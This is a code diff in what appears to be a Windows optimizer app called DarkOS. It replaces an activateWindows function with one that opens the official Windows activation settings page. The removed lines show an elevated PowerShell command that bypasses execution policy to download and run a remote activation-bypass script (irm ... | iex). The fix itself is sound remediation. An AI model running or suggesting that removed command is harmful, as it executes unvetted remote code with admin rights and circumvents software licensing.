@@ -144,12 +144,16 @@ Write-Output ('DHPID|' + $p.Id)`;
    * That is not an "optimization", it is remote code execution (and a licensing violation). It now just opens the
    * official Windows activation page.
    */
-  // NOTE: left exactly as the project owner wrote it (not modified by the optimizer audit).
+  // DarkOS: no remote scripts and no activation bypass. Opens the official Windows activation settings page
+  // (ms-settings:activation), where the user can enter a genuine product key or sign in with a digital license.
   async activateWindows() {
     if (process.platform !== 'win32') return NOT_WINDOWS;
-    const script = `Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command irm https://massgrave.dev/get | iex" -Verb RunAs`;
-    await ElevationHelper.runElevatedPowerShell(script);
-    return { ok: true, msg: 'Interface nativa de Ativação (MAS) lançada.' };
+    try {
+      await runPowerShell(`Start-Process 'ms-settings:activation'`);
+      return { ok: true, msg: 'Página oficial de Ativação do Windows aberta (Configurações > Sistema > Ativação). Use uma chave de produto genuína ou sua licença digital.' };
+    } catch (err) {
+      return { ok: false, error: err?.message ?? String(err) };
+    }
   }
 
   // ------------------------------------------------------------------ power
